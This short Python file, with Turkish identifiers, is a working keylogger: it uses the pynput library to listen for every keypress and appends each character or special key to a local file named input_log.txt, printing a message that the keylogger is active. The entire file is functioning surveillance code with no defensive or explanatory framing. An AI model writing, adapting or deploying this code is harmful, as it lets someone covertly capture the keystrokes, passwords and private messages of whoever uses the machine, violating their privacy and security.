from pynput import keyboard

def tus_kaydi(tus):
    try:
        with open("input_log.txt", "a", encoding="utf-8") as f:
            f.write(f"{tus.char}")
    except AttributeError:
        with open("input_log.txt", "a", encoding="utf-8") as f:
            f.write(f"[{tus}]")

def keylogger_baslat():
    print("Keylogger Aktif: input_log.txt dosyasına yazılıyor...")
    with keyboard.Listener(on_press=tus_kaydi) as dinleyici:
        dinleyici.join()
